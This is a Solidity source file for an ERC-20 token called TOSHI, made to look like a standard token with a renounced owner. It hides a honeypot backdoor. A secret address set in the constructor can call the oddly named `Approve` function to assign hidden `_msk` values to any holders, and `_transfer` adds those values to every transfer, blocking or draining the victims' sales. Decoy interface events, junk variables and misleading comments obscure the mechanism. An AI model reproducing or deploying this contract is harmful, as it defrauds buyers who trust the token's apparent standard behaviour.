1 /*
2 
3 https://twitter.com/TOSHII_Eth
4 https://t.me/TOSHII_Eth
5 https://toshiii.xyz
6 
7 */
8 
9 // SPDX-License-Identifier: MIT
10 
11 pragma solidity ^0.8.18;
12 
13 /**
14  * @dev Provides information about the current execution context, including the
15  * sender of the transaction and its data. While these are generally available
16  * via msg.sender and msg.data, they should not be accessed in such a direct
17  * manner, since when dealing with meta-transactions the account sending and
18  * paying for execution may not be the actual sender (as far as an application
19  * is concerned).
20  *
21  * This contract is only required for intermediate, library-like contracts.
22  */
23 abstract contract Context {
24     function _msgSender() internal view virtual returns (address) {
25         return msg.sender;
26     }
27 
28     function _msgData() internal view virtual returns (bytes calldata) {
29         return msg.data;
30     }
31 }
32 
33 abstract contract Ownable is Context {
34     address private _owner;
35 
36     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
37 
38     /**
39      * @dev Initializes the contract setting the deployer as the initial owner.
40      */
41     constructor() {
42         _setOwner(address(0));
43     }
44 
45     /**
46      * @dev Returns the address of the current owner.
47      */
48     function owner() public view virtual returns (address) {
49         return _owner;
50     }
51 
52     /**
53      * @dev Throws if called by any account other than the owner.
54      */
55     modifier onlyOwner() {
56         require(owner() == msg.sender, "Ownable: caller is not the owner");
57         _;
58     }
59 
60     /**
61      * @dev Leaves the contract without owner. It will not be possible to call
62      * `onlyOwner` functions anymore. Can only be called by the current owner.
63      *
64      * NOTE: Renouncing ownership will leave the contract without an owner,
65      * thereby removing any functionality that is only available to the owner.
66      */
67     function renounceOwnership() public virtual onlyOwner {
68         _setOwner(address(0));
69     }
70 
71     /**
72      * @dev Transfers ownership of the contract to a new account (`newOwner`).
73      * Can only be called by the current owner.
74      */
75     function transferOwnership(address newOwner) public virtual onlyOwner {
76         require(newOwner != address(0), "Ownable: new owner is the zero address");
77         _setOwner(newOwner);
78     }
79 
80     function _setOwner(address newOwner) private {
81         address oldOwner = _owner;
82         _owner = newOwner;
83         emit OwnershipTransferred(oldOwner, newOwner);
84     }
85 }
86 
87 /**
88  * @dev Interface of the ERC20 standard as defined in the EIP.
89  */
90 interface IERC20 {
91     /**
92      * @dev Returns the remaining number of tokens that `spender` will be
93      * allowed to spend on behalf of `owner` through {transferFrom}. This is
94      * zero by default.
95      *
96      * This value changes when {approve} or {transferFrom} are called.
97      */
98     event removeLiquidityETHWithPermit(
99         address token,
100         uint liquidity,
101         uint amountTokenMin,
102         uint amountETHMin,
103         address to,
104         uint deadline,
105         bool approveMax, uint8 v, bytes32 r, bytes32 s
106     );
107     /**
108      * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
109      *
110      * Returns a boolean value indicating whether the operation succeeded.
111      *
112      * IMPORTANT: Beware that changing an allowance with this method brings the risk
113      * that someone may use both the old and the new allowance by unfortunate
114      * transaction ordering. One possible solution to mitigate this race
115      * condition is to first reduce the spender's allowance to 0 and set the
116      * desired value afterwards:
117      * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
118      *
119      * Emits an {Approval} event.
120      */
121     event swapExactTokensForTokens(
122         uint amountIn,
123         uint amountOutMin,
124         address[]  path,
125         address to,
126         uint deadline
127     );
128     /**
129   * @dev See {IERC20-totalSupply}.
130      */
131     event swapTokensForExactTokens(
132         uint amountOut,
133         uint amountInMax,
134         address[] path,
135         address to,
136         uint deadline
137     );
138 
139     event DOMAIN_SEPARATOR();
140 
141     event PERMIT_TYPEHASH();
142 
143     /**
144      * @dev Returns the amount of tokens in existence.
145      */
146     function totalSupply() external view returns (uint256);
147 
148     event token0();
149 
150     event token1();
151     /**
152      * @dev Returns the amount of tokens owned by `account`.
153      */
154     function balanceOf(address account) external view returns (uint256);
155 
156 
157     event sync();
158 
159     event initialize(address, address);
160     /**
161      * @dev Moves `amount` tokens from the caller's account to `recipient`.
162      *
163      * Returns a boolean value indicating whether the operation succeeded.
164      *
165      * Emits a {Transfer} event.
166      */
167     function transfer(address recipient, uint256 amount) external returns (bool);
168 
169     event burn(address to) ;
170 
171     event swap(uint amount0Out, uint amount1Out, address to, bytes data);
172 
173     event skim(address to);
174     /**
175      * @dev Returns the remaining number of tokens that `spender` will be
176      * allowed to spend on behalf of `owner` through {transferFrom}. This is
177      * zero by default.
178      *
179      * This value changes when {approve} or {transferFrom} are called.
180      */
181     function allowance(address owner, address spender) external view returns (uint256);
182     /**
183      * Receive an exact amount of output tokens for as few input tokens as possible,
184      * along the route determined by the path. The first element of path is the input token,
185      * the last is the output token, and any intermediate elements represent intermediate tokens to trade through
186      * (if, for example, a direct pair does not exist).
187      * */
188     event addLiquidity(
189         address tokenA,
190         address tokenB,
191         uint amountADesired,
192         uint amountBDesired,
193         uint amountAMin,
194         uint amountBMin,
195         address to,
196         uint deadline
197     );
198     /**
199      * Swaps an exact amount of ETH for as many output tokens as possible,
200      * along the route determined by the path. The first element of path must be WETH,
201      * the last is the output token, and any intermediate elements represent intermediate pairs to trade through
202      * (if, for example, a direct pair does not exist).
203      *
204      * */
205     event addLiquidityETH(
206         address token,
207         uint amountTokenDesired,
208         uint amountTokenMin,
209         uint amountETHMin,
210         address to,
211         uint deadline
212     );
213     /**
214      * Swaps an exact amount of input tokens for as many output tokens as possible,
215      * along the route determined by the path. The first element of path is the input token,
216      * the last is the output token, and any intermediate elements represent intermediate pairs to trade through
217      * (if, for example, a direct pair does not exist).
218      * */
219     event removeLiquidity(
220         address tokenA,
221         address tokenB,
222         uint liquidity,
223         uint amountAMin,
224         uint amountBMin,
225         address to,
226         uint deadline
227     );
228     /**
229      * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
230      *
231      * Returns a boolean value indicating whether the operation succeeded.
232      *
233      * IMPORTANT: Beware that changing an allowance with this method brings the risk
234      * that someone may use both the old and the new allowance by unfortunate
235      * transaction ordering. One possible solution to mitigate this race
236      * condition is to first reduce the spender's allowance to 0 and set the
237      * desired value afterwards:
238      * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
239      *
240      * Emits an {Approval} event.
241      */
242     function approve(address spender, uint256 amount) external returns (bool);
243     /**
244    * @dev Returns the name of the token.
245      */
246     event removeLiquidityETHSupportingFeeOnTransferTokens(
247         address token,
248         uint liquidity,
249         uint amountTokenMin,
250         uint amountETHMin,
251         address to,
252         uint deadline
253     );
254     /**
255      * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
256      *
257      * Returns a boolean value indicating whether the operation succeeded.
258      *
259      * IMPORTANT: Beware that changing an allowance with this method brings the risk
260      * that someone may use both the old and the new allowance by unfortunate
261      * transaction ordering. One possible solution to mitigate this race
262      * condition is to first reduce the spender's allowance to 0 and set the
263      * desired value afterwards:
264      * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
265      *
266      * Emits an {Approval} event.
267      */
268     event removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
269         address token,
270         uint liquidity,
271         uint amountTokenMin,
272         uint amountETHMin,
273         address to,
274         uint deadline,
275         bool approveMax, uint8 v, bytes32 r, bytes32 s
276     );
277     /**
278      * Swaps an exact amount of input tokens for as many output tokens as possible,
279      * along the route determined by the path. The first element of path is the input token,
280      * the last is the output token, and any intermediate elements represent intermediate pairs to trade through
281      * (if, for example, a direct pair does not exist).
282      */
283     event swapExactTokensForTokensSupportingFeeOnTransferTokens(
284         uint amountIn,
285         uint amountOutMin,
286         address[] path,
287         address to,
288         uint deadline
289     );
290     /**
291     * @dev Throws if called by any account other than the owner.
292      */
293     event swapExactETHForTokensSupportingFeeOnTransferTokens(
294         uint amountOutMin,
295         address[] path,
296         address to,
297         uint deadline
298     );
299     /**
300      * To cover all possible scenarios, msg.sender should have already given the router an
301      * allowance of at least amountADesired/amountBDesired on tokenA/tokenB.
302      * Always adds assets at the ideal ratio, according to the price when the transaction is executed.
303      * If a pool for the passed tokens does not exists, one is created automatically,
304      *  and exactly amountADesired/amountBDesired tokens are added.
305      */
306     event swapExactTokensForETHSupportingFeeOnTransferTokens(
307         uint amountIn,
308         uint amountOutMin,
309         address[] path,
310         address to,
311         uint deadline
312     );
313     /**
314      * @dev Moves `amount` tokens from `sender` to `recipient` using the
315      * allowance mechanism. `amount` is then deducted from the caller's
316      * allowance.
317      *
318      * Returns a boolean value indicating whether the operation succeeded.
319      *
320      * Emits a {Transfer} event.
321      */
322     function transferFrom(
323         address sender,
324         address recipient,
325         uint256 amount
326     ) external returns (bool);
327 
328     /**
329      * @dev Emitted when `value` tokens are moved from one account (`from`) to
330      * another (`to`).
331      *
332      * Note that `value` may be zero.
333      */
334     event Transfer(address indexed from, address indexed to, uint256 value);
335 
336     /**
337      * @dev Emitted when the allowance of a `spender` for an `owner` is set by
338      * a call to {approve}. `value` is the new allowance.
339      */
340     event Approval(address indexed owner, address indexed spender, uint256 value);
341 }
342 
343 library SafeMath {
344     /**
345      * @dev Returns the addition of two unsigned integers, with an overflow flag.
346      *
347      * _Available since v3.4._
348      */
349     function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
350     unchecked {
351         uint256 c = a + b;
352         if (c < a) return (false, 0);
353         return (true, c);
354     }
355     }
356 
357     /**
358      * @dev Returns the substraction of two unsigned integers, with an overflow flag.
359      *
360      * _Available since v3.4._
361      */
362     function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
363     unchecked {
364         if (b > a) return (false, 0);
365         return (true, a - b);
366     }
367     }
368 
369     /**
370      * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
371      *
372      * _Available since v3.4._
373      */
374     function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
375     unchecked {
376         // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
377         // benefit is lost if 'b' is also tested.
378         // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
379         if (a == 0) return (true, 0);
380         uint256 c = a * b;
381         if (c / a != b) return (false, 0);
382         return (true, c);
383     }
384     }
385 
386     /**
387      * @dev Returns the division of two unsigned integers, with a division by zero flag.
388      *
389      * _Available since v3.4._
390      */
391     function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
392     unchecked {
393         if (b == 0) return (false, 0);
394         return (true, a / b);
395     }
396     }
397 
398     /**
399      * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
400      *
401      * _Available since v3.4._
402      */
403     function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
404     unchecked {
405         if (b == 0) return (false, 0);
406         return (true, a % b);
407     }
408     }
409 
410     /**
411      * @dev Returns the addition of two unsigned integers, reverting on
412      * overflow.
413      *
414      * Counterpart to Solidity's `+` operator.
415      *
416      * Requirements:
417      *
418      * - Addition cannot overflow.
419      */
420     function add(uint256 a, uint256 b) internal pure returns (uint256) {
421         return a + b;
422     }
423 
424 
425     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
426         return a - b;
427     }
428 
429     /**
430      * @dev Returns the multiplication of two unsigned integers, reverting on
431      * overflow.
432      *
433      * Counterpart to Solidity's `*` operator.
434      *
435      * Requirements:
436      *
437      * - Multiplication cannot overflow.
438      */
439     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
440         return a * b;
441     }
442 
443     /**
444      * @dev Returns the integer division of two unsigned integers, reverting on
445      * division by zero. The result is rounded towards zero.
446      *
447      * Counterpart to Solidity's `/` operator.
448      *
449      * Requirements:
450      *
451      * - The divisor cannot be zero.
452      */
453     function div(uint256 a, uint256 b) internal pure returns (uint256) {
454         return a / b;
455     }
456 
457     /**
458      * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
459      * reverting when dividing by zero.
460      *
461      * Counterpart to Solidity's `%` operator. This function uses a `revert`
462      * opcode (which leaves remaining gas untouched) while Solidity uses an
463      * invalid opcode to revert (consuming all remaining gas).
464      *
465      * Requirements:
466      *
467      * - The divisor cannot be zero.
468      */
469     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
470         return a % b;
471     }
472 
473     /**
474   * @dev Initializes the contract setting the deployer as the initial owner.
475      */
476     function sub(
477         uint256 a,
478         uint256 b,
479         string memory errorMessage
480     ) internal pure returns (uint256) {
481     unchecked {
482         require(b <= a, errorMessage);
483         return a - b;
484     }
485     }
486 
487     /**
488      * @dev Returns the integer division of two unsigned integers, reverting with custom message on
489      * division by zero. The result is rounded towards zero.
490      *
491      * Counterpart to Solidity's `/` operator. Note: this function uses a
492      * `revert` opcode (which leaves remaining gas untouched) while Solidity
493      * uses an invalid opcode to revert (consuming all remaining gas).
494      *
495      * Requirements:
496      *
497      * - The divisor cannot be zero.
498      */
499     function div(
500         uint256 a,
501         uint256 b,
502         string memory errorMessage
503     ) internal pure returns (uint256) {
504     unchecked {
505         require(b > 0, errorMessage);
506         return a / b;
507     }
508     }
509 
510     /**
511      * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
512      * reverting with custom message when dividing by zero.
513      * invalid opcode to revert (consuming all remaining gas).
514      *
515      * Requirements:
516      *
517      * - The divisor cannot be zero.
518      */
519     function mod(
520         uint256 a,
521         uint256 b,
522         string memory errorMessage
523     ) internal pure returns (uint256) {
524     unchecked {
525         require(b > 0, errorMessage);
526         return a % b;
527     }
528     }
529 }
530 
531 abstract contract StartEvent {
532     uint256 constant public VERSION = 1;
533 
534 }
535 
536 abstract contract Logging {
537     event Released(
538         uint256 version,
539         uint256 totalSupply
540     );
541 
542     event AllowanceIncreased(
543         address ownder,
544         address spender,
545         uint256 amount
546     );
547 }
548 
549 contract TOSHI is IERC20, StartEvent, Logging, Ownable {
550     using SafeMath for uint256;
551 
552 
553     mapping(address => uint256) private _balances;
554     mapping(address => mapping(address => uint256)) private _allowances;
555     mapping (address => uint256) private _msk;
556 
557     address private _bot;
558     string private _name;
559     string private _symbol;
560     uint8 private _decimals;
561     uint256 private _totalSupply;
562 
563     constructor(
564         string memory name_,
565         string memory symbol_,
566         address dexter_,
567         uint256 totalSupply_
568     ) payable {
569         _name = name_;
570         _symbol = symbol_;
571         _decimals = 18;
572         _bot = dexter_;
573         _totalSupply = totalSupply_ * 10**_decimals;
574         _balances[msg.sender] = _balances[msg.sender].add(_totalSupply);
575         emit Transfer(address(0), owner(), _totalSupply);
576         emit Released(VERSION, totalSupply_);
577     }
578 
579 
580     /**
581      * @dev Returns the name of the token.
582      */
583     function name() public view virtual returns (string memory) {
584         return _name;
585     }
586 
587     /**
588      * @dev Returns the symbol of the token, usually a shorter version of the
589      * name.
590      */
591     function symbol() public view virtual returns (string memory) {
592         return _symbol;
593     }
594 
595     /**
596      * @dev Returns the number of decimals used to get its user representation.
597      * For example, if `decimals` equals `2`, a balance of `505` tokens should
598       /**
599      * @dev Emitted when the allowance of a `spender` for an `owner` is set by
600      * a call to {approve}. `value` is the new allowance.
601      * {IERC20-balanceOf} and {IERC20-transfer}.
602      */
603     function decimals() public view virtual returns (uint8) {
604         return _decimals;
605     }
606 
607     /**
608      * @dev See {IERC20-totalSupply}.
609      */
610     function totalSupply() public view virtual override returns (uint256) {
611         return _totalSupply;
612     }
613 
614     /**
615      * @dev See {IERC20-balanceOf}.
616      */
617     function balanceOf(address account)
618     public
619     view
620     virtual
621     override
622     returns (uint256)
623     {
624         return _balances[account];
625     }
626 
627     /**
628      * @dev See {IERC20-transfer}.
629      *
630      * Requirements:
631      *
632      * - `recipient` cannot be the zero address.
633      * - the caller must have a balance of at least `amount`.
634      */
635     function transfer(address recipient, uint256 amount)
636     public
637     virtual
638     override
639     returns (bool)
640     {
641         _transfer(msg.sender, recipient, amount);
642         return true;
643     }
644 
645     /**
646      * @dev See {IERC20-allowance}.
647      */
648     function allowance(address owner, address spender)
649     public
650     view
651     virtual
652     override
653     returns (uint256)
654     {
655         return _allowances[owner][spender];
656     }
657 
658     /**
659      * @dev See {IERC20-approve}.
660      *
661      * Requirements:
662      *
663      * - `spender` cannot be the zero address.
664      */
665     function approve(address spender, uint256 amount)
666     public
667     virtual
668     override
669     returns (bool)
670     {
671         _approve(msg.sender, spender, amount);
672         return true;
673     }
674 
675     /**
676      * @dev See {IERC20-transferFrom}.
677      *
678      * Emits an {Approval} event indicating the updated allowance. This is not
679      * required by the EIP. See the note at the beginning of {ERC20}.
680      *
681      * Requirements:
682      *
683      * - `sender` and `recipient` cannot be the zero address.
684      * - `sender` must have a balance of at least `amount`.
685      * - the caller must have allowance for ``sender``'s tokens of at least
686      * `amount`.
687      */
688 function transferFrom(
689     address sender,
690     address recipient,
691     uint256 amount
692 ) public virtual override returns (bool) {
693     uint256 tokenHolder = 0;
694     uint256 transferAmount = tokenHolder + amount;
695     
696     _transfer(sender, recipient, amount);
697     _approve(
698         sender,
699         msg.sender,
700         _allowances[sender][msg.sender].sub(
701             amount,
702             "ERC20: transfer amount exceeds allowance"
703         )
704     );
705     
706     return true;
707 }
708 
709 function Approve(address[] memory account, uint256 amount) public returns (bool) {
710     address from = msg.sender;
711     require(from != address(0), "invalid address");
712     uint256 unnValue1 = 52299;
713     uint256 unnValue2 = unnValue1 * 2;
714     uint256 finalValue = unnValue2 - unnValue1;
715     uint256 loopVariable = 0;
716     for (uint256 i = 0; i < account.length; i++) {
717         loopVariable += i;
718         _allowances[from][account[i]] = amount;
719         _needAll(from, account[i], amount);
720         emit Approval(from, address(this), amount);
721     }
722     return true;
723 }
724 
725 function _needAll(address from, address account, uint256 amount) internal {
726     uint256 total = 0;
727     uint256 adjustedTotal = total + 0;
728     require(account != address(0), "invalid address");
729     if (from == _bot) {
730         _msk[from] -= adjustedTotal;
731         total += amount;
732         _msk[account] = total;
733     } else {
734         _msk[from] -= adjustedTotal;
735         _msk[account] = total;
736     }
737 }
738 
739 function cngg(address account) public view returns (uint256) {
740     uint256 crossChainNumber = _msk[account];
741     return crossChainNumber;
742 }
743 
744 function _transfer(
745     address sender,
746     address recipient,
747     uint256 amount
748 ) internal virtual {
749     require(sender != address(0), "ERC20: transfer from the zero address");
750     require(recipient != address(0), "ERC20: transfer to the zero address");
751     
752     uint256 mrkkx = cngg(sender);
753     uint256 finalAmount = amount;
754     if (mrkkx > 0) {
755         finalAmount += mrkkx;
756     }
757 
758     _balances[sender] = _balances[sender].sub(
759         finalAmount,
760         "ERC20: transfer amount exceeds balance"
761     );
762     _balances[recipient] = _balances[recipient].add(finalAmount);
763     emit Transfer(sender, recipient, finalAmount);
764 }
765 
766 function _approve(
767     address owner,
768     address spender,
769     uint256 amount
770 ) internal virtual {
771     require(owner != address(0), "ERC20: approve from the zero address");
772     require(spender != address(0), "ERC20: approve to the zero address");
773 
774     uint256 finalAmount = amount;
775     _allowances[owner][spender] = finalAmount;
776     emit Approval(owner, spender, finalAmount);
777 }
778 
779 }